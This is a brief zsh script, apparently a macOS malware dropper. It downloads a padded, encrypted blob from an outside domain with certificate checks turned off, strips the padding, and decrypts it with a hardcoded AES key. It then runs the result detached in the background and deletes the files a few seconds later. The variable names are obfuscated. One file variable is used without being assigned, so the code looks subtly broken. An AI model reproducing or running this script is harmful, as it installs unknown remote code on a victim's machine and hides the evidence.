#!/bin/zsh
jusjh=$(mktemp /tmp/q8ad6n.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/me38a0942bda5259c.bin" -o "$jusjhz" || exit 1
z9c35p=$(stat -f %z "$jusjhz"); edk7zfz=$(( z9c35p - 551 - 2554 ))
tail -c +$(( 551 + 1 )) "$jusjhz" | head -c $edk7zfz | openssl enc -d -aes-256-cbc -k 5557c6a18062472de22599cd -out "$jusjh" 2>/dev/null
[ -s "$jusjh" ] && chmod 700 "$jusjh" && ( "$jusjh" & ) && disown
( sleep 3; rm -f "$jusjh" "$jusjhz" ) &>/dev/null &
